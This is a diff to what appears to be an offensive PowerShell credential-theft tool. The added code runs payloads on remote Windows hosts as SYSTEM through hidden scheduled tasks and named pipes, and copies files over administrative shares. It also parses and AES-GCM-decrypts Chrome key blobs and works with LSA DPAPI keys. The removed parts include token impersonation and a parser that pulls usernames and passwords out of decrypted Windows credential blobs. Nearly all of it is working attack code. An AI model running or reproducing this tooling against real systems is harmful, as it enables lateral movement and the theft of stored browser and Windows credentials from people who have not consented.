+            $script += '$deflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encArgs),[IO.Compression.CompressionMode]::Decompress)' + [Environment]::NewLine
+            $script += '$serializedArgs = New-Object Byte[](' + $length + ')' + [Environment]::NewLine
+            $script += '$deflatedStream.Read($serializedArgs, 0, ' + $length + ') | Out-Null' + [Environment]::NewLine
+            $script += '$deflatedStream.Dispose()' + [Environment]::NewLine
+            $script += '$argList = [Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Unicode.GetString($serializedArgs))' + [Environment]::NewLine
+        }
+        else {
+            $script += '$argList = $null' + [Environment]::NewLine
+        }
+        $script += '$output = [Management.Automation.PSSerializer]::Serialize(((New-Module -ScriptBlock $scriptBlock -ArgumentList $argList -ReturnResult) *>&1))' + [Environment]::NewLine
+        $script += '$encOutput = [char[]]$output' + [Environment]::NewLine
+        $script += '$writer = [IO.StreamWriter]::new($s)' + [Environment]::NewLine
+        $script += '$writer.AutoFlush = $true' + [Environment]::NewLine
+        $script += '$writer.WriteLine($encOutput)' + [Environment]::NewLine
+        $script += '$writer.Dispose()' + [Environment]::NewLine
+        $script += '$r.Dispose()' + [Environment]::NewLine
+        $script += '$s.Dispose()' + [Environment]::NewLine
+        $script = $script -creplace '(?m)^\s*\r?\n',''
+        $payload = [char[]] $script
+
+        # Create scheduled task
+        try {
+            $taskParameters = @{
+                TaskName = [guid]::NewGuid().Guid
+                Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell" -Argument $argument
+                Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+                Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $CimSession
+            }
+            Write-Verbose "[$computerName] Registering scheduled task $($taskParameters.TaskName)"
+            $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $CimSession -ErrorAction Stop
+            Write-Verbose "[$computerName] Running scheduled task as SYSTEM"
+            $cimJob = $scheduledTask | Start-ScheduledTask -AsJob -ErrorAction Stop
+
+            Write-Verbose "[$computerName] Connecting to named pipe server \\$computerName\pipe\$pipename"
+            $pipeclient.Connect($pipeTimeout)
+            $writer = New-Object  IO.StreamWriter($pipeclient)
+            $writer.AutoFlush = $true
+            $writer.WriteLine($payload)
+            $reader = New-Object IO.StreamReader($pipeclient)
+            $output = ''
+            while (($data = $reader.ReadLine()) -ne $null) {
+                $output += $data + [Environment]::NewLine
+            }
+            Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
+            $scheduledTaskInfo = $scheduledTask | Get-ScheduledTaskInfo
+            if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) {
+                Write-Warning "[$computerName] Failed to execute scheduled task."
+            }
+        }
+        catch {
+            Write-Error "[$computerName] Task execution failed. $_"
+        }
+        finally {
+            Write-Verbose "[$computerName] Unregistering scheduled task $($taskParameters.TaskName)"
+            if ($Protocol -eq 'Wsman') {
+                $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$False | Out-Null
+            }
+            else {
+                $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask | Out-Null
+            }
+            if ($reader) {
+                $reader.Dispose()
+            }
+            $pipeclient.Dispose()
+        }
+    }
+    End {
+        if ($logonToken) {
+            Invoke-RevertToSelf -TokenHandle $logonToken
+        }
+    }
+}
+
+Function Local:Get-CimDirectory {
+    Param (
+        [ValidateNotNullorEmpty()]
+        [String]
+        $Path = ".",
+
+        [Switch]
+        $Recurse,
+
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Microsoft.Management.Infrastructure.CimSession]
+        $CimSession
+    )
+
+    Begin {
+        $path = $path.TrimEnd("\")
+        $cimParams = @{
+            ClassName  = "Win32_Directory"
+            Filter     = "Name='$($path.Replace("\", "\\"))'"
+            CimSession = $CimSession
+            Verbose    = $false
+        }
+    }
+
+    Process {
+        $currentDir = Get-CimInstance @cimParams
+
+        # Enumerate files
+        $currentDir | Get-CimAssociatedInstance -ResultClassName CIM_DataFile -Verbose:$false
+
+        # Enumerate directories
+        $subDir = $currentDir | Get-CimAssociatedInstance -ResultClassName Win32_Directory -Verbose:$false |
+            Where-Object { (Split-Path $_.Name) -eq $currentDir.Name } # Filter out the parent folder
+        $subDir
+
+        if ($Recurse -and $subDir) {
+            foreach ($directory in $subDir) {
+                Get-CimDirectory -Path $directory.Name -Recurse -CimSession $cimSession
+            }
+        }
+    }
+
+    End {}
+}
+
+Function Local:Get-RemoteFile {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [String]
+        $Path,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        $Destination,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerName = $env:COMPUTERNAME,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+    Begin {
+        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") {
+            $stringBuilder = New-Object System.Text.StringBuilder
+            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % {
+                [Void]$stringBuilder.Append($_.ToString("x2"))
+            }
+            return $stringBuilder.ToString()
+        }
+    }
+    Process {
+        # Download file via SMB
+        $fileDrive = ($Path -split ':').Get(0)
+        $filePath = ($Path -split ':').Get(1)
+        if ($Credential.Username) {
+            $sharePath = "\\$ComputerName\$fileDrive`$"
+            $localDrive = Get-StringHash $sharePath.ToLower()
+            if (-not $global:mappedDrives.Contains($localDrive)) {
+                New-PSDrive -Name $localDrive -Root $sharePath -PSProvider "FileSystem" -Credential $Credential -Scope Global | Out-Null
+                $global:mappedDrives.add($localDrive) | Out-Null
+            }
+            Copy-Item -Path "${localDrive}:$filePath" -Destination $Destination -Recurse
+        }
+        else {
+            Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
+        }
+    }
+    End {}
+}
+
+Function Local:Get-ShadowLsaDpapiKey {
     Param (
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
@@ -613,111 +957,144 @@ Function Get-ShadowLsaDpapiKey {
     End {}
 }
 
-# Adapted from PowerView by @harmj0y and @mattifestation
-Function Local:Invoke-UserImpersonation {
-    [OutputType([IntPtr])]
-    Param (
-        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential,
-
-        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
-        [ValidateNotNull()]
-        [IntPtr]
-        $TokenHandle,
-
-        [Switch]
-        $Quiet
-    )
-
-    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
-        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+Function Local:Parse-ChromeKeyBlob {
+    Param ([byte[]] $BlobData)
+    $currentOffset = 0
+    # Read header_len (4 bytes, little-endian)
+    $headerLength = [BitConverter]::ToInt32($BlobData, $currentOffset)
+    $currentOffset += 4
+    # Header bytes
+    $headerBytes = $BlobData[$currentOffset..($currentOffset + $headerLength - 1)]
+    $currentOffset += $headerLength
+    # Read content_len (4 bytes, little-endian)
+    $contentLength = [BitConverter]::ToInt32($BlobData, $currentOffset)
+    $currentOffset += 4
+    # Validate length
+    if (($headerLength + $contentLength + 8) -ne $BlobData.Length) {
+        throw "Length mismatch: headerLen + contentLen + 8 != blobData.Length"
     }
-
-    if ($PSBoundParameters['TokenHandle']) {
-        $LogonTokenHandle = $TokenHandle
+    # Read flag (1 byte)
+    $encryptionFlag = $BlobData[$currentOffset]
+    $currentOffset += 1
+    $parseResult = @{
+        Header          = $headerBytes
+        Flag            = $encryptionFlag
+        Iv              = $null
+        Ciphertext      = $null
+        Tag             = $null
+        EncryptedAesKey = $null
+    }
+    if ($encryptionFlag -eq 1 -or $encryptionFlag -eq 2) {
+        # These flags are identified but not currently supported for decryption
+        # [flag|iv|ciphertext|tag] -> [1byte|12bytes|32bytes|16bytes]
+        $parseResult.Iv = $BlobData[$currentOffset..($currentOffset + 11)]
+        $currentOffset += 12
+        $parseResult.Ciphertext = $BlobData[$currentOffset..($currentOffset + 31)]
+        $currentOffset += 32
+        $parseResult.Tag = $BlobData[$currentOffset..($currentOffset + 15)]
+    }
+    elseif ($encryptionFlag -eq 3) {
+        # [flag|encrypted_aes_key|iv|ciphertext|tag] -> [1byte|32bytes|12bytes|32bytes|16bytes]
+        $parseResult.EncryptedAesKey = $BlobData[$currentOffset..($currentOffset + 31)]
+        $currentOffset += 32
+        $parseResult.Iv = $BlobData[$currentOffset..($currentOffset + 11)]
+        $currentOffset += 12
+        $parseResult.Ciphertext = $BlobData[$currentOffset..($currentOffset + 31)]
+        $currentOffset += 32
+        $parseResult.Tag = $BlobData[$currentOffset..($currentOffset + 15)]
     }
     else {
-        $LogonTokenHandle = [IntPtr]::Zero
-        $NetworkCredential = $Credential.GetNetworkCredential()
-        $UserDomain = $NetworkCredential.Domain
-        $UserName = $NetworkCredential.UserName
-        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
-
-        if (-not [Native]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
-            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
-        }
+        throw "Unsupported flag: $encryptionFlag"
     }
-
-    if (-not [Native]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
-        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
-    }
-    $LogonTokenHandle
+    return New-Object PSObject -Property $parseResult
 }
 
-Function Local:Invoke-RevertToSelf {
-    Param (
-        [ValidateNotNull()]
-        [IntPtr]
-        $TokenHandle
-    )
-
-    if ($PSBoundParameters['TokenHandle']) {
-        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
-        [Native]::CloseHandle($TokenHandle) | Out-Null
+Function Local:ConvertFrom-Hex {
+    Param([string]$HexString)
+    $bytes = New-Object byte[] ($HexString.Length / 2)
+    for ($i = 0; $i -lt $bytes.Length; $i++) {
+        $bytes[$i] = [Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
     }
-    if (-not [Native]::RevertToSelf()) {
-        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
-    }
+    return $bytes
 }
 
-Function Local:Get-CimDirectory {
-    Param (
-        [ValidateNotNullorEmpty()]
-        [String]
-        $Path = ".",
+Function Local:XorBytes {
+    Param([byte[]]$firstArray, [byte[]]$secondArray)
+    if ($firstArray.Length -ne $secondArray.Length) {
+        throw "Key lengths mismatch: $($firstArray.Length) vs $($secondArray.Length)"
+    }
+    $resultArray = New-Object byte[] $firstArray.Length
+    for ($i = 0; $i -lt $firstArray.Length; $i++) {
+        $resultArray[$i] = $firstArray[$i] -bxor $secondArray[$i]
+    }
+    return $resultArray
+}
 
-        [Switch]
-        $Recurse,
-
-        [Parameter(Mandatory = $True)]
-        [ValidateNotNullOrEmpty()]
-        [Microsoft.Management.Infrastructure.CimSession]
-        $CimSession
-    )
-
-    Begin {
-        $path = $path.TrimEnd("\")
-        $cimParams = @{
-            ClassName  = "Win32_Directory"
-            Filter     = "Name='$($path.Replace("\", "\\"))'"
-            CimSession = $CimSession
-            Verbose    = $false
+Function Local:Decrypt-WithAesGcm {
+    Param ([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)
+    try {
+        [IntPtr]$hAlg = [IntPtr]::Zero
+        [IntPtr]$hKey = [IntPtr]::Zero
+        $ntStatus = [BCrypt]::BCryptOpenAlgorithmProvider([Ref]$hAlg, "AES", $null, 0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptOpenAlgorithmProvider failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        $ntStatus = [BCrypt]::BCryptSetProperty($hAlg, "ChainingMode", "ChainingModeGCM", 0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptSetProperty failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        $ntStatus = [BCrypt]::BCryptGenerateSymmetricKey($hAlg, [Ref]$hKey, $null, 0, $Key, $Key.Length, 0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptGenerateSymmetricKey failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        $authInfo = New-Object -TypeName BCrypt+BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+        $authInfo.dwInfoVersion = 1
+        $authInfo.cbSize = [Runtime.InteropServices.Marshal]::SizeOf([type][BCrypt+BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO])
+        $cbNonce = $Iv.Length
+        $pbNonce = [Runtime.InteropServices.Marshal]::AllocHGlobal($cbNonce)
+        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $pbNonce, $cbNonce)
+        $authInfo.cbNonce = $cbNonce
+        $authInfo.pbNonce = $pbNonce
+        $cbTag = $Tag.Length
+        $pbTag = [Runtime.InteropServices.Marshal]::AllocHGlobal($cbTag)
+        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $pbTag, $cbTag);
+        $authInfo.cbTag = $cbTag
+        $authInfo.pbTag = $pbTag
+        $size = 0
+        $ntStatus = [BCrypt]::BCryptGetProperty($hAlg, "AuthTagLength", $null, 0, [ref] $size, 0x0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptGetProperty(1) failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        $tagLengthsValue = New-Object byte[] $size
+        $ntStatus = [BCrypt]::BCryptGetProperty($hAlg, "AuthTagLength", $tagLengthsValue, $tagLengthsValue.Length, [ref] $size, 0x0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptGetProperty(2) failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        $maxAuthTagSize = [BitConverter]::ToInt32(@($tagLengthsValue[4], $tagLengthsValue[5], $tagLengthsValue[6], $tagLengthsValue[7]), 0)
+        $ivData = New-Object byte[] $maxAuthTagSize
+        $plainTextSize = 0
+        $ntStatus = [BCrypt]::BCryptDecrypt($hKey, $Ciphertext, $Ciphertext.Length, [ref] $authInfo, $ivData, $ivData.Length, $null, 0, [ref] $plainTextSize, 0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptDecrypt(1) failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        $decBytes = New-Object byte[] $plainTextSize
+        $ntStatus = [BCrypt]::BCryptDecrypt($hKey, $Ciphertext, $Ciphertext.Length, [ref] $authInfo, $ivData, $ivData.Length, $decBytes, $decBytes.Length, [ref] $plainTextSize, 0)
+        if ($ntStatus -ne 0) {
+            throw "BCryptDecrypt(2) failed: 0x$('{0:X8}' -f $ntStatus)"
+        }
+        Write-Output $decBytes
+    }
+    catch {
+        Write-Error $_
+    }
+    finally {
+        if ($pbNonce) {
+            [Runtime.InteropServices.Marshal]::FreeHGlobal($pbNonce)
+        }
+        if ($cbTag) {
+            [Runtime.InteropServices.Marshal]::FreeHGlobal($cbTag)
         }
     }
-
-    Process {
-        $currentDir = Get-CimInstance @cimParams
-
-        # Enumerate files
-        $currentDir | Get-CimAssociatedInstance -ResultClassName CIM_DataFile -Verbose:$false
-
-        # Enumerate directories
-        $subDir = $currentDir | Get-CimAssociatedInstance -ResultClassName Win32_Directory -Verbose:$false |
-            Where-Object { (Split-Path $_.Name) -eq $currentDir.Name } # Filter out the parent folder
-        $subDir
-
-        if ($Recurse -and $subDir) {
-            foreach ($directory in $subDir) {
-                Get-CimDirectory -Path $directory.Name -Recurse -CimSession $cimSession
-            }
-        }
-    }
-
-    End {}
 }
 
 Function Local:Decrypt-MasterKeyWithSha {
@@ -1045,11 +1422,8 @@ Function Local:Decrypt-DpapiBlob {
             [Array]::Copy($BlobBytes, $offset, $guidMasterKeyBytes, 0, 16)
             $guidMasterKey = New-Object Guid @(,$guidMasterKeyBytes)
             $guidString = [string] $guidMasterKey
-            #Write-Verbose "guidMasterKey: $guidString"
-            #Write-Verbose "size: $($BlobBytes.Length)"
             $offset += 16
             $flags = [BitConverter]::ToUInt32($BlobBytes, $offset)
-            #Write-Verbose "flags: 0x$($flags.ToString("X"))"
             $offset += 4
             $descLength = [BitConverter]::ToInt32($BlobBytes, $offset)
             $offset += 4
@@ -1068,8 +1442,6 @@ Function Local:Decrypt-DpapiBlob {
             $offset += 4 + $hmacKeyLen
             $algHash = [BitConverter]::ToInt32($BlobBytes, $offset)
             $offset += 4
-            #Write-Verbose "algHash/algCrypt: $algHash/$algCrypt"
-            #Write-Verbose "description: $description"
             $algHashLen = [BitConverter]::ToInt32($BlobBytes, $offset)
             $offset += 4
             $hmac2KeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
@@ -1105,87 +1477,6 @@ Function Local:Decrypt-DpapiBlob {
     }
 
     End {}
-}
-
-Function Local:Get-CredentialBlob {
-    Param (
-        [byte[]]
-        $DecBlobBytes
-    )
-
-    $offset = 0
-    $credFlags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $credSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $credUnk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $type = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $flags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $lastWritten = [long] [BitConverter]::ToInt64($decBlobBytes, $offset)
-    $offset += 8
-    $lastWrittenTime = New-Object DateTime
-    try {
-        # Check that decrypytion worked correctly
-        $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
-    }
-    catch {
-        Write-Error "Credential blob decryption failed"
-        return
-    }
-
-    $unkFlagsOrSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $persist = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $attributeCount = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $unk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $unk1 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
-    $offset += 4
-    $targetNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
-    $offset += 4
-    $targetName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetNameLen)
-    $offset += $targetNameLen
-    $targetAliasLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
-    $offset += 4
-    $targetAlias = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetAliasLen)
-    $offset += $targetAliasLen
-    $commentLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
-    $offset += 4
-    $comment = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $commentLen)
-    $offset += $commentLen
-    $unkDataLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
-    $offset += 4
-    $unkData = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $unkDataLen)
-    $offset += $unkDataLen
-    $userNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
-    $offset += 4
-    $userName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $userNameLen)
-    $offset += $userNameLen
-    $credBlobLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
-    $offset += 4
-    $credBlobBytes = New-Object byte[] $credBlobLen
-    [Array]::Copy($decBlobBytes, $offset, $credBlobBytes, 0, $credBlobLen)
-    $offset += $credBlobLen
-    [int] $opt = 0xffff
-    try {
-        $credBlob = [Text.Encoding]::Unicode.GetString($credBlobBytes)
-    }
-    catch {
-        $credBlob = [BitConverter]::ToString($credBlobBytes).Replace("-", " ")
-    }
-    $cred = [ordered]@{}
-    $cred["UserName"] = $userName.Trim()
-    $cred["Password"] = $credBlob.Trim()
-    $cred["Data"] = $unkData.Trim()
-    $cred["TargetName"] = $targetName.Trim()
-    $cred["TargetAlias"] = $targetAlias.Trim()
-    $cred["Comment"] = $comment.Trim()
-    return (New-Object PSObject -Property $cred)
 }
 
 Add-Type -TypeDefinition @'
